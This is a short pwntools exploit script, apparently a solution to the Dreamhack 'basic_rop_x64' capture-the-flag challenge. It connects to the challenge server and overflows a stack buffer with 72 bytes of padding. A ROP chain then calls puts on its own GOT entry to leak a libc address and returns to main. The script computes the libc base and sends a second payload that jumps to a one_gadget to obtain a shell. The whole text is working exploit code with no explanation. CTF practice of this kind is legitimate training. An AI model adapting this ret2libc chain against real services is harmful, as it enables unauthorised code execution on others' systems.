from pwn import *
exe = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")
r = remote("host3.dreamhack.games", 22549)
# r = process("./basic_rop_x64_patched")
# gdb.attach(r, gdbscript='''
#            b*main+67
#            c
#            ''')
input()
pop_rdi = 0x0000000000400883
payload = b"a" * 72
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendline(payload)

r.recvuntil(b"a" * 0x40)
leak_libc = u64(r.recvline(keepends=False) + b"\0\0")
log.info("leak libc: " + hex(leak_libc))
libc.address = leak_libc - 456336
one_gadget = 0x45216

payload1 = b"a" * 72 + p64(libc.address + one_gadget)
r.sendline(payload1)
r.interactive()
